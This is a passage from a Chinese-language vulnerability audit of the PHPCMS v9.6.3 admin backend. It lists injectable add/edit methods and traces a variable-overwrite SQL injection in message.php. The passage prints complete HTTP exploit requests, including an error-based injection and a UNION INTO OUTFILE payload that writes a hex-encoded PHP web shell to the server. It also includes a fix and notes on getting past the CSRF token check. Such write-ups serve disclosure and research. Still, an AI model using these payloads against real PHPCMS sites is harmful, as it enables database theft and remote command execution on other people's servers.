> \phpcms\modules\poster\poster.php
>
> add方法insert注入/edit方法update型注入
>
> \phpcms\modules\poster\space.php
>
> add方法insert注入/edit方法update型注入
>
> \phpcms\modules\search\search_type.php
>
> add方法insert注入/edit方法update型注入
>
> \phpcms\modules\special\content.php
>
> add方法insert注入/edit方法update型注入
>
> \phpcms\modules\special\special.php
>
> add方法insert注入/edit方法update型注入
>
> \phpcms\modules\admin\badword.php
>
> add方法insert注入/edit方法update型注入
>
> \phpcms\modules\admin\category.php
>
> add方法insert注入/edit方法update型注入
>
> \phpcms\modules\admin\copyfrom.php
>
> add方法insert注入/edit方法update型注入
>
> \phpcms\modules\admin\ipbanned.php
>
> add方法insert注入/edit方法update型注入
>
> \phpcms\modules\admin\keylink.php
>
> add方法insert注入/edit方法update型注入
>
> \phpcms\modules\admin\menu.php
>
> add方法insert注入/edit方法update型注入
>
> \phpcms\modules\admin\position.php
>
> add方法insert注入/edit方法update型注入
>
> \phpcms\modules\admin\role.php
>
> add方法insert注入/edit方法update型注入
>
> \phpcms\modules\admin\urlrule.php
>
> add方法insert注入/edit方法update型注入
这里其实还有个思路，先insert要into
outfile的数据到数据库中，然后找到一个二次入库的点，可以getshell，不过随便找了一下，发现phpcms二次入库的点还挺少的，直接放弃。
**4.3 因为变量覆盖导致的注入**
> \phpcms\modules\message\message.php
在search_message函数中
第259行初始化`$where`参数
第260行，将`$_POST['search']`中的键注册为变量
第280行，`$where`参数传入listinfo函数
在listinfo函数中
第58行，`$where`传入count函数
在count函数中
第142行`$where`传入get_one函数
在get_one函数中
第140行进入execute函数执行
综上，因为extract函数的关系，这里`$where参数(通过$_POST['search']['where'])`是可控的，可构造一个不带单双引号的注入
请求如下：
    POST /index.php?m=message&c=message&a=search_message&menuid=1620 HTTP/1.1
    Host: 192.168.99.127
    Content-Length: 208
    Cache-Control: max-age=0
    Origin: http://192.168.99.127
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36
    Content-Type: application/x-www-form-urlencoded
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    DNT: 1
    Referer: http://192.168.99.127/index.php?m=message&c=message&a=init&menuid=1620&pc_hash=0rStVl
    Accept-Language: en,zh-CN;q=0.8,zh;q=0.6
    Cookie: 
    Connection: close
    search[status]=&search[username]=todaro&search[start_time]=&search[end_time]=&dosubmit=%CB%D1%CB%F7&pc_hash=0rStVl&search[where]=1=(updatexml(1,concat(0x5e24,(select user()),0x5e24),1))%23
最后执行的数据库语句为
    SELECT COUNT(*) AS num FROM `phpcmsv9`.`v9_message` WHERE 1=(updatexml(1,concat(0x5e24,(select user()),0x5e24),1))# AND send_from_id='todaro' or send_to_id='todaro'
不过因为phpcms的全局处理，所以如果在`$where`参数中加入单双引号是会过滤的，所以这里也不能into outfile
不过回头又重新看了一下，发现事情还有转机
在listinfo函数将`$where`参数传入count函数后
`$where`会被to_sqls函数进行处理
在该函数中会判断传入的参数，如果是数组，会分别将键值对取出来，键只添加``，而值会加单引号
所以如果如果能给to_sqls函数传入数组，那么在键中就可以加入单双引号！
来重新看一下search_message函数
如果不进入第264行和第272行中，`$where`就能是一个数组
综合第261行的判断，这里只要让`$username`为空、`$start_time`和`$end_time`其中一个为空，即可满足要求。
综上,请求如下数据
    POST /index.php?m=message&c=message&a=search_message&menuid=1620 HTTP/1.1
    Host: 192.168.99.127
    Content-Length: 333
    Cache-Control: max-age=0
    Origin: http://192.168.99.127
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36
    Content-Type: application/x-www-form-urlencoded
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    DNT: 1
    Referer: http://192.168.99.127/index.php?m=message&c=message&a=init&menuid=1620&pc_hash=xxxxx
    Accept-Language: en,zh-CN;q=0.8,zh;q=0.6
    Cookie: 
    Connection: close
    search[status]=&search[username]=&search[start_time]=1&search[end_time]=&dosubmit=%CB%D1%CB%F7&pc_hash=xxxxx&search[where][replyid`/**//**/union/**/select/**/0x3c3f706870204061737365727428245f4745545b27636d64275d293b3f3e/**/into/**/outfile/**/'C:/www/cms/phpcms_v9.6.3_GBK/phpcms/modules/message/1.php'%23]=1
(绝对路径由前面爆路径所得)
如果当前数据库用户有写权限，即可生成/phpcms/modules/message/1.php文件
我们再来看一下这个操作所需要的权限及位置：
> 位置：模块 > 模块列表 > 短消息 >“搜索处”
>
> 设置该权限：设置 > 管理员设置 > 角色管理 >权限设置>模块>模块列表>短消息
短消息这个功能对于后台用户（总编、编辑、运营总监、发布人员、站点管理员、超级管理员）来说，赋予其这个权限应该不算太高吧？
修复建议：
修改\phpcms\modules\message\message.php文件
第260行为
    extract($_POST['search'],EXTR_SKIP);
修改后即可防止变量覆盖，无法getshell。
像\phpcms\modules\message\message.php文件一样因为变量覆盖导致注入的还有以下文件，这里只列举，不再赘述：
> \phpcms\modules\pay\payment.php
>
> pay_list函数/pay_stat函数
>
> \phpcms\modules\admin\ipbanned.php
>
> search_ip函数
>
> \phpcms\modules\attachment\manage.php
>
> init函数
上面的注入都存在于后台中，所以会验证pc_hash这个值，而这个值也是用来进行csrf防御的，主要在调用一些函数时会校验该值，所以管理员直接访问/index.php?m=admin是不需要校验该值，而且请求后pc_hash的值会返回给客户端。如果我能找到一个前台的xss，那么就能定向管理员然后获取pc_hash这个值，最后以csrf漏洞的利用方式一样，在后台为所欲为以至于getshell。但是phpcms前台用户的操作很有限，我反正没找到xss。
不过我在后台中找到了一个反射型xss，但是如同上面说的在调用一些函数时会校验pc_hash的值，这就成悖论了：要想触发后台xss，就得先有pc_hash，但是pc_hash又得通过xss获取。怎么办，回过头来审视一下pc_hash校验的过程，看看到底是调用哪些函数会触发该校验。后台操作默认都会有这一个引入
调用\phpcms\modules\admin\classes\admin.class.php类admin的__construct函数
第18行调用check_priv函数
在该函数的第171行如果`$_GET[‘a’]`参数为public_开头的则返回true